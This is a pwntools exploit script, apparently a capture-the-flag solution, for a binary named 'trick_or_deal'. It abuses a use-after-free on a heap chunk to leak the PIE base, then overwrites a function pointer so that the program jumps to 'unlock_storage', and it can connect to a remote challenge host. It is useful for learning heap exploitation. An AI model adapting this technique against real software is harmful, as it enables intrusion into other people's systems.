#!/usr/bin/env python3
#17-05-2022
#Gon

from pwn import *
exe = ELF('./trick_or_deal')
libc = ELF('./glibc/libc.so.6', checksec=False)

context.binary = exe
context.log_level='debug'


def conn():
    if args.REMOTE:
        io = remote('138.68.175.87', 31931)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

#ret2win func: unlock_storage() 

def show():
    io.sendlineafter(b'do? ', b'1')

#read 0x47 into stack
def buy(data):
    io.sendlineafter(b'do? ', b'2')
    io.sendafter(b'? ', data)

def malloc(size, data):
    io.sendlineafter(b'do? ', b'3')
    io.sendlineafter(b': ', b'y')
    io.sendlineafter(b'? ', str(size))
    io.sendafter(b'? ', data)

def free():
    io.sendlineafter(b'do? ', b'4')

io = conn()

free()
#Malloc a chunk with the same size of the the weapon chunk freed
malloc(0x50, b'A'*0x48)

#Leak Pie base
show()
io.recvuntil(b'A'*0x48)
leak = io.recvuntil(b'\x20\x1b', drop=True)
exe.address = u64(leak.ljust(8, b'\x00')) - 0xbe6
info("Pie Base: %#x", exe.address)

#Free again the weapon chunk
free()
#Write the last 8 bytes of the chunk with the ret2win func
malloc(0x50, b'V'*0x48 + p64(exe.sym.unlock_storage))

#execute the ret2win func with the code in choice 1 "See weaponry": (**(code **)(storage + 0x48))();
show()
io.interactive()
